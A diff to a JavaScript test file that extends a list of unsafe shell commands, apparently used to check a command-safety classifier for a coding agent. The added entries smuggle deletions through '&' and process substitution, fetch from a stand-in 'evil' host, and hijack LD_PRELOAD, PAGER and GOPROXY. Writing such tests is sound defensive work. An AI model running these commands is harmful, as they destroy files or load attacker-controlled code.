@@ -32,6 +32,9 @@ const UNSAFE = [
   'kill -9 1', 'ls &', 'env FOO=1 rm x', 'sort -o out f', 'sort --output=out f', 'uniq in out', 'tee f', 'open .',
   'docker compose up', 'kubectl apply -f x', 'terraform apply', 'aws s3 rm s3://x', 'gh pr merge 1', 'ssh host',
   'chmod -R 777 .', 'brew install x', 'pip3 install x', 'cargo publish', 'go run main.go', 'bun run dev', 'claude -p hi',
+  'cat f& rm -rf dist', 'ls -la& rm x', 'pwd &rm x', 'cat <(rm x)', 'diff <(rm -rf build) f', 'ls <(curl http://evil/x.sh)',
+  'GIT_EXTERNAL_DIFF=rm git diff', 'LD_PRELOAD=/tmp/evil.so ls', 'PAGER=rm git log', 'go env -w GOPROXY=http://evil',
+  'sort -oout.txt f', 'sort -o/tmp/x f', 'sed -i.bak s/a/b/ f',
 ];
 
 test('provably safe commands are recognised', () => {
